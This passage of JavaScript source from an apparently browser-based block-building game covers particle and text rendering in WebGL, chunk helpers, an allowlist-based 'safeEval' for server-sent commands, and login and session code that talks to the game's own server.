			let vx = rand(-0.25,0.25), vy = rand(-0.25,0.25), vz = rand(-0.25,0.25)
			if(type === "small"){
				let mag = sqrt(vx*vx+vy*vy+vz*vz)*10
				vx /= mag, vy /= mag, vz /= mag
			}else if(type === "medium"){
				let mag = sqrt(vx*vx+vy*vy+vz*vz)*5
				vx /= mag, vy /= mag, vz /= mag
			}else if(type === "large"){
				let mag = sqrt(vx*vx+vy*vy+vz*vz)
				vx /= mag, vy /= mag, vz /= mag
			}else if(type === "star"){
				let mag = sqrt(vx*vx+vy*vy+vz*vz)
				vx /= mag, vy /= mag, vz /= mag
				let a = cos(vx*Math.PId) * cos(vy*Math.PId) * cos(vz*Math.PId)
				vx *= a, vy *= a, vz *= a
			}
			world.addParticle(new entities[entityIds.Spark](x,y,z,vx,vy,vz,color),dimension)
		}
		if(!remote) send({
      type:"particles", particleType:"fireworkExplode",
      x,y,z,dimension,data:{type,color}
    })
	}
	win.fireworkExplode = fireworkExplode
  
	let shockwaveVaos = [], experienceOrbVaos = [], genericVaos = [], dripVaos = {}, splashVaos = [], sparkVaos = []
  function initCachedShapes(){return//todo n
    let shape = shapes.blockParticle
		shockwaveVaos.length = 0
    shockwaveVaos.size = shape.size
    let shapeVerts = shape.verts
    let shapeTexVerts = shape.texVerts
    for(let i=0; i<16; i++){
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      let texVerts = textureCoords[textureMap["explosion_"+i]]
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      var vao = glExtensions.vertex_array_object.createVertexArrayOES()
      const verticesBuffer = gl.createBuffer()
      const textureBuffer = gl.createBuffer()
      glExtensions.vertex_array_object.bindVertexArrayOES(vao)
      gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

      gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

      gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

      gl.enableVertexAttribArray(glCache.aVertexParticle)
      gl.enableVertexAttribArray(glCache.aTextureParticle)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)
      shockwaveVaos.push(vao)
    }
    
    //xp
    shape = shapes.blockParticle
    experienceOrbVaos.size = shape.size
		experienceOrbVaos.length = 0
    shapeVerts = shape.verts
    shapeTexVerts = shape.texVerts
    for(let y=0; y<4; y++){
      for(let x=0; x<4; x++){
        let texVerts = textureCoords[textureMap["experienceOrb"+(x + y*4)]]
        if(!texVerts) continue
        
        let blockSides = Object.keys(Block)
        let texture = []
        let index = 0
        for (let n = 0; n < 6; n++) {
          let side = blockSides[n]
          let directionalFaces = shapeVerts[n]
          for (let facei = 0; facei < directionalFaces.length; facei++) {
            let tx = texVerts[0]
            let ty = texVerts[1]
						let tw = texVerts[2]-tx
						let th = texVerts[5]-ty
						let texShapeVerts = shapeTexVerts[n][facei]
						texture[index    ] = tx + texShapeVerts[0]*tw
						texture[index + 1] = ty + texShapeVerts[1]*th
						texture[index + 2] = tx + texShapeVerts[2]*tw
						texture[index + 3] = ty + texShapeVerts[3]*th
						texture[index + 4] = tx + texShapeVerts[4]*tw
						texture[index + 5] = ty + texShapeVerts[5]*th
						texture[index + 6] = tx + texShapeVerts[6]*tw
						texture[index + 7] = ty + texShapeVerts[7]*th
            index += 8
          }
        }
        var vao = glExtensions.vertex_array_object.createVertexArrayOES()
        const verticesBuffer = gl.createBuffer()
        const textureBuffer = gl.createBuffer()
        glExtensions.vertex_array_object.bindVertexArrayOES(vao)
        gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

        gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

        gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

        gl.enableVertexAttribArray(glCache.aVertexParticle)
        gl.enableVertexAttribArray(glCache.aTextureParticle)
        glExtensions.vertex_array_object.bindVertexArrayOES(null)
        experienceOrbVaos.push(vao)
      }
    }
    
    //generic particle
    shape = shapes.blockParticle
    genericVaos.size = shape.size
		genericVaos.length = 0
    shapeVerts = shape.verts
    for(let i=0; i<8; i++){
			let texVerts = textureCoords[textureMap["generic_"+i]]
      /*let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      var vao = glExtensions.vertex_array_object.createVertexArrayOES()
      const verticesBuffer = gl.createBuffer()
      const textureBuffer = gl.createBuffer()
      glExtensions.vertex_array_object.bindVertexArrayOES(vao)
      gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

      gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

      gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

      gl.enableVertexAttribArray(glCache.aVertexParticle)
      gl.enableVertexAttribArray(glCache.aTextureParticle)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)*/
      genericVaos.push(generatParticleVAO(shape, texVerts[0], texVerts[1], texVerts[2]-texVerts[0], texVerts[5]-texVerts[1], true).vao)
    }

    //drip
    shape = shapes.blockParticle
    dripVaos.size = shape.size
    shapeVerts = shape.verts
		let texVerts = textureCoords[textureMap.dripHang]
		dripVaos.hang = generatParticleVAO(shape, texVerts[0], texVerts[1], texVerts[2]-texVerts[0], texVerts[5]-texVerts[1], true).vao
		texVerts = textureCoords[textureMap.dripFall]
		dripVaos.fall = generatParticleVAO(shape, texVerts[0], texVerts[1], texVerts[2]-texVerts[0], texVerts[5]-texVerts[1], true).vao
		texVerts = textureCoords[textureMap.dripLand]
		dripVaos.land = generatParticleVAO(shape, texVerts[0], texVerts[1], texVerts[2]-texVerts[0], texVerts[5]-texVerts[1], true).vao
    /*for(let y=0; y<2; y++){
      for(let x=0; x<2; x++){
        let blockSides = Object.keys(Block)
        let texture = []
        let index = 0
        for (let n = 0; n < 6; n++) {
          let side = blockSides[n]
          let directionalFaces = shapeVerts[n]
          for (let facei = 0; facei < directionalFaces.length; facei++) {
            let texVerts = textureCoords[textureMap.drip]
            let tx = texVerts[0]
            let ty = texVerts[1]
						let tw = (texVerts[2]-texVerts[0])/2
						let th = (texVerts[5]-texVerts[1])/2
						tx += tw*x/2, ty += th*y/2
            texture[index    ] = tx + tw
            texture[index + 1] = ty
            texture[index + 2] = tx
            texture[index + 3] = ty
            texture[index + 4] = tx
            texture[index + 5] = ty + th
            texture[index + 6] = tx + tw
            texture[index + 7] = ty + th
            index += 8
          }
        }
        var vao = glExtensions.vertex_array_object.createVertexArrayOES()
        const verticesBuffer = gl.createBuffer()
        const textureBuffer = gl.createBuffer()
        glExtensions.vertex_array_object.bindVertexArrayOES(vao)
        gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

        gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

        gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

        gl.enableVertexAttribArray(glCache.aVertexParticle)
        gl.enableVertexAttribArray(glCache.aTextureParticle)
        glExtensions.vertex_array_object.bindVertexArrayOES(null)
        dripVaos.push(vao)
      }
    }*/

    //splash
    shape = shapes.blockParticle
    splashVaos.size = shape.size
    shapeVerts = shape.verts
		for(let i=0; i<4; i++){
			texVerts = textureCoords[textureMap["splash_"+i]]
			splashVaos[i] = generatParticleVAO(shape, texVerts[0], texVerts[1], texVerts[2]-texVerts[0], texVerts[5]-texVerts[1], true).vao
		}
    /*for(let y=0; y<2; y++){
      for(let x=0; x<2; x++){
        var texSize = 1/2
        let blockSides = Object.keys(Block)
        let texture = []
        let index = 0
        for (let n = 0; n < 6; n++) {
          let side = blockSides[n]
          let directionalFaces = shapeVerts[n]
          for (let facei = 0; facei < directionalFaces.length; facei++) {
            let texVerts = textureCoords[textureMap.splash]
            let tx = texVerts[0]
            let ty = texVerts[1]
						let tw = (texVerts[2]-texVerts[0])/2
						let th = (texVerts[5]-texVerts[1])/2
						tx += tw*x/2, ty += th*y/2
            texture[index    ] = tx + tw
            texture[index + 1] = ty
            texture[index + 2] = tx
            texture[index + 3] = ty
            texture[index + 4] = tx
            texture[index + 5] = ty + th
            texture[index + 6] = tx + tw
            texture[index + 7] = ty + th
            index += 8
          }
        }
        var vao = glExtensions.vertex_array_object.createVertexArrayOES()
        const verticesBuffer = gl.createBuffer()
        const textureBuffer = gl.createBuffer()
        glExtensions.vertex_array_object.bindVertexArrayOES(vao)
        gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

        gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

        gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

        gl.enableVertexAttribArray(glCache.aVertexParticle)
        gl.enableVertexAttribArray(glCache.aTextureParticle)
        glExtensions.vertex_array_object.bindVertexArrayOES(null)
        splashVaos.push(vao)
      }
    }*/

		//spark
		shape = shapes.blockParticle
    sparkVaos.size = shape.size
		sparkVaos.length = 0
    shapeVerts = shape.verts
    for(let i=0; i<6; i++){
      let blockSides = Object.keys(Block)
      let texture = []
      let index = 0
      let texVerts = textureCoords[textureMap["spark_"+i]]
      for (let n = 0; n < 6; n++) {
        let side = blockSides[n]
        let directionalFaces = shapeVerts[n]
        for (let facei = 0; facei < directionalFaces.length; facei++) {
          let tx = texVerts[0]
          let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
          index += 8
        }
      }
      var vao = glExtensions.vertex_array_object.createVertexArrayOES()
      const verticesBuffer = gl.createBuffer()
      const textureBuffer = gl.createBuffer()
      glExtensions.vertex_array_object.bindVertexArrayOES(vao)
      gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

      gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

      gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

      gl.enableVertexAttribArray(glCache.aVertexParticle)
      gl.enableVertexAttribArray(glCache.aTextureParticle)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)
      sparkVaos.push(vao)
    }
  }
  
  entities[entities.length] = class TextDisplay extends Entity{
		static name2 = "TextDisplay"
		constructor(x,y,z,text,size,color,background,glow) {
      size = size || 1/2
			super(x, y, z, 0, 0, 0, 0, 0, size, size, size, null,null, 0, 0)
      this.gravityStength = 0
      this.offsetZ = 0
      this.offsetX = 0
      this.facesPlayer = true
      
      this.vao = glExtensions.vertex_array_object.createVertexArrayOES()
      this.buffer = gl.createBuffer()
      this.setText(text)
      this.color = color || [1,1,1]
      this.background = background || [0,0,0,0]
      this.glow = glow || false
      this.size = size
		}
    setText(text){
      if(userInfo ? userInfo.profanityFilter : true) for(var obj of Messages.remove){ //remove bad words
        text = text.replace(obj.replace, obj.with)
      }//if you change this, change the one in Messages.format

			let textStr = text
			text = Array.from(text)//split into unicode
      let data = new Float32Array(text.length*32)
      let lineData = []
      let x = 0, y = 0
      let lineW = []
      let line = 0
      let i = 0
      let color = [0,0,0], colorSet = 0, bold = false, italic = false
			const italicX = tan(14*Math.PI/180)
			for (let idx = 0; idx<text.length; idx++) {
        let l = text[idx]
        if(l === ""){
					let code = text[idx+1]
					if(code === "l"){
						bold = true
					}else if(code === "o"){
						italic = true
					}else if(code === "r"){
						bold = false, italic = false
						colorSet = 0
					}else{
						color = colors.rgb[code] || color
						colorSet = 1
					}
          idx++
          continue
        }
        if(l === "\n"){
          x = 0
          y -= 10/8//linegap = 2
          line++
          continue
        }
        
        let coords = textCoords[bold ? "b"+l : l] || textCoords["\0"]
				let coordsPixels = textCoordsPixels[bold ? "b"+l : l] || textCoordsPixels["\0"]
        data[i] = x + (italic ? italicX*coordsPixels[3] : 0)
        data[i+1] = y + coordsPixels[3]
        data[i+2] = coords[0]
        data[i+3] = coords[1]
        data[i+4] = color[0]
        data[i+5] = color[1]
        data[i+6] = color[2]
        data[i+7] = colorSet
        
        data[i+8] = x + coordsPixels[2] + (italic ? italicX*coordsPixels[3] : 0)
        data[i+9] = y + coordsPixels[3]
        data[i+10] = coords[0] + coords[2]
        data[i+11] = coords[1]
        data[i+12] = color[0]
        data[i+13] = color[1]
        data[i+14] = color[2]
        data[i+15] = colorSet
        
        data[i+16] = x + coordsPixels[2]
        data[i+17] = y
        data[i+18] = coords[0] + coords[2]
        data[i+19] = coords[1] + coords[3]
        data[i+20] = color[0]
        data[i+21] = color[1]
        data[i+22] = color[2]
        data[i+23] = colorSet
        
        data[i+24] = x
        data[i+25] = y
        data[i+26] = coords[0]
        data[i+27] = coords[1] + coords[3]
        data[i+28] = color[0]
        data[i+29] = color[1]
        data[i+30] = color[2]
        data[i+31] = colorSet
        
        x += coordsPixels[2]
        lineData[i/32] = line
        lineW[line] = x
        i += 32
			}
      for(i = 0; i<data.length; i+=8){
        data[i] -= lineW[lineData[floor(i/32)]] / 2
        data[i+1] -= y/2
      }
      
      this.faces = i / 32
      glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)
			gl.bindBuffer(gl.ARRAY_BUFFER, this.buffer)
			gl.bufferData(gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW)
			gl.enableVertexAttribArray(glCache.aVertexText)
			gl.enableVertexAttribArray(glCache.aTextureText)
			gl.enableVertexAttribArray(glCache.aColorText)
			gl.enableVertexAttribArray(glCache.aColorSetText)
			gl.vertexAttribPointer(glCache.aVertexText, 2, gl.FLOAT, false, 32, 0)
			gl.vertexAttribPointer(glCache.aTextureText, 2, gl.FLOAT, false, 32, 8)
			gl.vertexAttribPointer(glCache.aColorText, 3, gl.FLOAT, false, 32, 16)
			gl.vertexAttribPointer(glCache.aColorSetText, 1, gl.FLOAT, false, 32, 28)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      this.text = textStr
    }
		update() {
      this.canFacePlayer = true
			this.lastUpdate = now
			this.previousX = this.x
			this.previousY = this.y
			this.previousZ = this.z
		}
    render(){
      world.renderTextDisplay(this)
    }
		renderText() {
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = (this.y - this.previousY) * diff + this.previousY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      
			const offsetY = this.offsetY, offsetX = this.offsetX, offsetZ = this.offsetZ
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery + offsetY, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
      modelMatrix.translate(0,0,offsetZ)
			modelMatrix.scale(this.width, this.height, this.depth)
      modelMatrix.translate(offsetX,0,0)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)
			const skysLight = world.getLight(x, y, z, 0, this.dimension)
			const lightLevel = min(max(skysLight * skyLight / 15, blockLight / 15), 1.0)
			gl.uniform1i(glCache.uSamplerText, 9)
      gl.uniform1i(glCache.glowText, this.glow)
			gl.uniform1f(glCache.uLightLevelText, lightLevel)
			gl.uniform1f(glCache.uLanternText, lantern - dist3(this.x,this.y,this.z, p.renderX,p.renderY,p.renderZ) / 10.0)
      gl.uniform3f(glCache.colorText, ...this.color)
      gl.uniform4f(glCache.backgroundText, ...this.background)
      gl.uniform1f(glCache.brightnessText, brightness)
			gl.uniformMatrix4fv(glCache.uViewText, false, modelViewProjectionMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
		}
	}
	let {entityOrder, entityIds} = win
	let unorderedEntities = entities
	entities = []
	for(let i=0; i<unorderedEntities.length; i++){
		if(unorderedEntities[i] === undefined){
			continue
		}
		let ri = entityIds[unorderedEntities[i].name2]
		entities[ri] = unorderedEntities[i]
		entities[ri].prototype.entId = ri
		entities[ri].prototype.type = entities[ri].name2
		if(serverEntities[ri]) entities[ri].nameMcd = serverEntities[ri].nameMcd
	}
	console.log(entities.length,'entities and particles')
	win.entities = entities

	let analytics = {
		totalTickTime: 0,
		worstFrameTime: 0,
		totalRenderTime: 0,
		totalFrameTime: 0,
		lastUpdate: 0,
		frames: 1,
    ticks: 1,
		displayedTickTime: "0",
		displayedRenderTime: "0",
		displayedFrameTime: "0",
		displayedwFrameTime: 0,
		fps: 0,
    tps: 0,
		badFrameTimeCount:0
	}
	function chunkDist(c) {
		let dx = p.x - c.x
		let dz = p.z - c.z
		if (dx > 16) {
			dx -= 16
		} else if (dx > 0) {
			dx = 0
		}
		if (dz > 16) {
			dz -= 16
		} else if (dz > 0) {
			dz = 0
		}
		return Math.sqrt(dx * dx + dz * dz)
	}
	function sortChunks(c1, c2) { //Sort the list of chunks based on distance from the player
		let dx1 = p.x - c1.x - 8
		let dy1 = p.z - c1.z - 8
		let dx2 = p.x - c2.x - 8
		let dy2 = p.z - c2.z - 8
		return dx1 * dx1 + dy1 * dy1 - (dx2 * dx2 + dy2 * dy2)
	}
	function fillReqs(x, z, dimension) {
		// Chunks must all be loaded first.
		if(dimension !== p.dimension) return
		let done = true
		const loadArea = world.isMK ? 2 : 1
		for (let i = x - loadArea; i <= x + loadArea; i++) {
			for (let j = z - loadArea; j <= z + loadArea; j++) {
				let chunk = world.getChunk(i*16,j*16,dimension)//world.loaded[(i + world.offsetX) * world.lwidth + j + world.offsetZ]
				if (!chunk || !chunk.loaded){
					done = false
					continue
				}
				if (world.isMK && !chunk.lit && i >= x - 1 && i <= x + 1 && j >= z - 1 && j <= z + 1) {
					if(!world.lightingQueue.includes(chunk)) world.lightingQueue.push(chunk)
					done = false
				}
			}
		}
		return done
	}
	function unfillReqs(x, z, dimension, dist, chunk){
		if(dist >= 1 && chunk.lit){
			chunk.lit = false
			//world.unlightingQueue.push(chunk)
		}
	}
	function maxDist(x, z, x2, z2) {
		let ax = abs(x2 - x)
		let az = abs(z2 - z)
		return max(ax, az)
	}
	function renderFilter(chunk) {
		return maxDist(chunk.x >> 4, chunk.z >> 4, p.cx, p.cz) <= settings.renderDistance
	}

	function debug(message) {
		let ellapsed = performance.now() - debug.start
		if (ellapsed > 30) {
			console.log(message, ellapsed.toFixed(2), "milliseconds")
		}
	}

	const allowedVars = ["reportError", "structuredClone", "launchQueue", "loadString", "logError", "hcyl", "cyl", "sphereoid", "sphereoidAt", "ball", "lookAt", "scrollToEl", "canvas", "ctx", "canvas2", "ctx2", "savebox", "boxCenterTop", "uploadWorld", "messageInput", "editSignBox", "generateID", "semiTransTextures", "textures", "animated", "BLOCK_COUNT", "emptyFunc", "pistonFindStickyBlocksConnectedTo", "getPistonPushedBlocks", "getPistonPulledBlocks", "world", "setSeed", "getSeed", "getRotation", "PVector", "dist2", "dist3", "mag", "save", "genWorldImage", "saveToDB", "loadFromDB", "deleteFromDB", "blockData", "blockIds", "inventoryBlocks", "eachFrame", "crafts", "smelts", "smeltFuel", "settings", "worldSettings", "generator", "images", "drawImage", "changeBlockMode", "bigArray", "changeScene", "getScene", "hitBox", "entHitbox", "crack", "speak", "runCmd", "Messages", "showTitle", "sideMessage", "customMenu", "damage", "modelView", "setControl", "changeKey", "resetKey", "inventory", "updateGLSL", "shapes", "initModelView", "explode", "goToDimension", "Item", "BlockEntity", "MovingBlock", "ExperienceOrb", "Player", "BlockParticle", "PoofParticle", "poof", "playerPoof", "FallingDustParticle", "RedstoneParticle", "ShockwaveParticle", "SmokeParticle", "NoteParticle", "glint", "TextDisplay", "timeoutPromise", "userInfo", "playersInv", "playerSkins", "playerCapes", "World", "invScroll", "pTouch", "initWebglPrograms", "marketplaceData", "sounds", "music", "soundNames", "playSound", "blockSound", "hitSound", "explodeSound", "posSound", "playMusic", "menuMusicVolume", "menuMusicIdx", "currentMusic", "allLoaded", "rdmSplash", "setSplash", "setSplashText", "gl", "glCache", "textureImageData", "textureImageCanvas", "textCanvas", "textCoords", "player", "p2", "islandGenerator", "renderMainBG", "audioCtx", "listener", "setHotbar", "clearInv", "cheats", "p", "p2", "respawn", "thirdPersonReach", "sky"];//delete anything from this that might allow dangerous activity
	function isNumeric(value) {
		return /^-?\d+$/.test(value);
	}
	function getObject(obj, prop) {
		if (typeof obj === 'undefined') return false;
		var index = prop.indexOf('.')+1 || prop.indexOf('[')+1;
		if (index > 0) {
			return getObject(obj[prop.substring(0, index-1)], prop.substr(index));
		}
		return [obj, prop];
	}
	function setObject(to, code) {
		let arrayIndex = to[1] && (to[1].length-1) || 0;
		arrayIndex = to[1].substring(0, arrayIndex);
		if (typeof to[0][to[1]] === "function") to[0][to[1]](...code);//function
		else if(isNumeric(arrayIndex)) to[0][parseInt(arrayIndex)] = code //array
		else to[0][to[1]] = code //object
	}
	function safeEval(data){
		//created by Luke Powers to avoid XSS attacks
		//cannot include html elements because scripts could be put in them
		
		/*
		an acceptable input for data.data would look like this
		[
		{name: world, property: 'setTags', code: [0, 0, 0]},
		{name: player, property: 'pos.x', code: 0}
		]
		*/
		
		data.forEach((i) => {
			var prop = i.property || '';
			try {
				switch (i.name) {
					case 'world':
						//any nessesary restrictions can be made in here
						setObject(getObject(world, prop), i.code);
					break;
					/*case "resetInv":
						setHotbar([0,0,0,0,0,0,0,0,0]);
						clearInv();
						respawn();
					break;*/
					default:
						if (allowedVars.includes(i.name)) {
							if (typeof window[i.name] === 'function') {
								window[i.name](...i.code);
								return;
							} else if (prop !== '') {
								setObject(getObject(window[i.name], prop), i.code);
								return
							}
							window[i.name] = i.code;
							return;
						}
						console.error(`${i.name} is not an authorized name.`)
						break;
				}
			} catch (e) {
				console.error(e);
			}
		});
	}
	win.safeEval = safeEval
  
  function timeoutPromise(p, time){
    return new Promise((resolve, reject) => {
      var start = Date.now()
      var t = setTimeout(resolve, time)
      p.then(r => {
        if(Date.now() - start < time){
          clearTimeout(t)
          resolve(r)
        }
      }).catch(reject)
    })
  }
  win.timeoutPromise = timeoutPromise
  
  let userInfo = null
	let userSid, userSpwd, userSessionString = ""//for authentication
  function updateUserTo(fetchRes){
    if(typeof fetchRes === "object"){
      p.username = fetchRes.username
      userInfo = fetchRes
      //p.character.changeBlock(abs(r.hashCode()) % 80 + 1)
      p.setSkin(fetchRes.skin)
      p.setCape(fetchRes.cape)
      return p.username
    }else{
      p.username = "Steve"
      userInfo = null
      return null
    }
  }
	function getCookieValue(name){
		const regex = new RegExp(`(^| )${name}=([^;]+)`)
		const match = document.cookie.match(regex)
		if (match) {
			return match[2]
		}
	}
	function setUserSession(o,noSave){
		if(o) userSid = o.sid, userSpwd = o.spwd
		else userSid = getCookieValue("sid"), userSpwd = getCookieValue("spwd")
		userSessionString = userSid ? "thingmakersauth sid="+userSid+",spwd="+userSpwd : ""
		if(!noSave) saveToDB("userSession",{sid:userSid,spwd:userSpwd})
	}

	function evalAtCorrectScope(str){
		eval(str)
	}
  
  function login(){
    return new Promise((resolve, reject) => {
      /*var w = width / 2
      var h = height / 2
      var x = w - (w/2)
      var y = h - (h/2)*/
			let frame = document.createElement("iframe")
			frame.src = "/login"
			frame.style = "position:absolute;top:10vh;left:10vw;width:80vw;height:80vh;"
			document.body.appendChild(frame)
      var w = frame.contentWindow//window.open("/login", "login","resizable=no,width="+w+",height="+h+",top="+y+",left="+x)
      function onmsg(event){
        if (event.source !== w) return;
        if (event.data.logged){
          frame.remove()
          window.removeEventListener("message", onmsg);
          resolve(event.data.logged)
        }else if(event.data.canceled){
          frame.remove()
          window.removeEventListener("message", onmsg);
          reject()
        }
      }
      window.addEventListener("message", onmsg);
    })
  }

  async function loggedIn(){
		if(multiplayer && multiplayer.differentAccount){
			updateUserTo(multiplayer.differentAccount)
			return
		}
		
    var logged = false;
    await fetch("/server/account", {headers:{Authorization:userSessionString}}).then(r => r.json()).then(r => {
      logged = updateUserTo(r)
    }, console.error)
    if(logged){
      return logged
    }else{
      if(confirm("Your not logged in. Press OK to login.")){
        let logged = await login().catch(r => r)
        if(logged){
					setUserSession(logged)
          await fetch("/server/account", {headers:{Authorization:userSessionString}}).then(r => r.json()).then(r => {
            logged = updateUserTo(r)
          }, console.error)
          return logged
        }
      }
      return false
      changeScene("main menu")
    }
  }
  async function getWorlds(addWorldCallback,pingCallback){
    if(!navigator.onLine) return "You are offline. Connect to the internet first."
    let worlds = []
    await fetch("/server/worlds").then(r => r.json()).then(r => {
      for(var w of r){
				worlds.push(w)
        if(addWorldCallback) addWorldCallback(w)
      }
    }, console.error)
    await fetch("/server/servers").then(r => r.json()).then(r => {
      for(var v of r){
        let obj = {
          external: true,
          name:v.name,
          id:v.id,
          description:v.description,
          players:v.players,
          thumbnail:v.thumbnail,
          url:v.url,
          wsurl:v.wsurl,
          safe:v.safe,
					version:v.version
        }
        worlds.push(obj)
        addWorldCallback(obj)
      }
    }, console.error)
    if(pingCallback){
      await fetch("/server/worldsPing").then(r => r.json()).then(pings => {
        for(let p in pings){
          pingCallback(p,pings[p])
        }
      }, console.error)
    }
    return worlds
  }
